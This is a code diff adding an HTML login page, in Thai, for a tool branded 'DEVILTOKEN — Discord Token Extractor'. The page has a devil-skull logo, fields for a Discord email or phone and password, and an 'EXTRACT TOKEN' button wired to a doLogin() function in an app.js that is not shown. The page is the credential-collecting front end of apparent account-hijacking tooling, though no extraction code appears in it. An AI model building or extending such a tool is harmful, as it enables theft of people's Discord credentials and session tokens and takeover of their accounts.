@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DEVILTOKEN — LOGIN</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div id="login-page">
+    <div class="brand">
+      <div class="brand-icon">
+        <!-- Custom Devil SVG -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+          <!-- Horns -->
+          <polygon points="25,35 12,2 38,22" fill="white"/>
+          <polygon points="75,35 88,2 62,22" fill="white"/>
+          <!-- Circuit lines from horns -->
+          <line x1="12" y1="2" x2="5" y2="2" stroke="white" stroke-width="1.5"/>
+          <line x1="5" y1="2" x2="5" y2="20" stroke="white" stroke-width="1.5"/>
+          <circle cx="5" cy="20" r="2" fill="white"/>
+          <line x1="88" y1="2" x2="95" y2="2" stroke="white" stroke-width="1.5"/>
+          <line x1="95" y1="2" x2="95" y2="20" stroke="white" stroke-width="1.5"/>
+          <circle cx="95" cy="20" r="2" fill="white"/>
+          <!-- Skull -->
+          <ellipse cx="50" cy="55" rx="28" ry="27" fill="white"/>
+          <!-- Jaw -->
+          <rect x="37" y="71" width="26" height="13" rx="2" fill="white"/>
+          <!-- Teeth gaps (black) -->
+          <rect x="39" y="71" width="5" height="9" fill="black"/>
+          <rect x="47" y="71" width="5" height="9" fill="black"/>
+          <rect x="55" y="71" width="5" height="9" fill="black"/>
+          <!-- Eyes -->
+          <ellipse cx="40" cy="52" rx="6" ry="7" fill="black"/>
+          <ellipse cx="60" cy="52" rx="6" ry="7" fill="black"/>
+          <!-- Red pupils -->
+          <ellipse cx="40" cy="52" rx="3" ry="4" fill="#ff2222"/>
+          <ellipse cx="60" cy="52" rx="3" ry="4" fill="#ff2222"/>
+          <!-- Nose -->
+          <path d="M47 61 L53 61 L50 66 Z" fill="black"/>
+          <!-- Circuit cheeks -->
+          <line x1="78" y1="50" x2="90" y2="50" stroke="white" stroke-width="1" opacity="0.5"/>
+          <line x1="90" y1="50" x2="90" y2="62" stroke="white" stroke-width="1" opacity="0.5"/>
+          <circle cx="90" cy="62" r="1.5" fill="white" opacity="0.5"/>
+          <line x1="22" y1="50" x2="10" y2="50" stroke="white" stroke-width="1" opacity="0.5"/>
+          <line x1="10" y1="50" x2="10" y2="62" stroke="white" stroke-width="1" opacity="0.5"/>
+          <circle cx="10" cy="62" r="1.5" fill="white" opacity="0.5"/>
+        </svg>
+      </div>
+      <div>
+        <div class="brand-name">DEVILTOKEN</div>
+        <div class="brand-tag">Discord Token Extractor</div>
+      </div>
+    </div>
+
+    <div class="page-title">// ชั้นที่ 2 — ยืนยันตัวตน</div>
+
+    <div class="card">
+      <div class="form-group">
+        <label>Email / Phone</label>
+        <input type="email" id="email" placeholder="user@example.com" autocomplete="off" />
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="password" placeholder="••••••••••••" />
+      </div>
+
+      <div class="error-msg" id="err-msg"></div>
+
+      <button class="btn-primary" id="btn-login" onclick="doLogin()">
+        ▶ EXTRACT TOKEN
+      </button>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
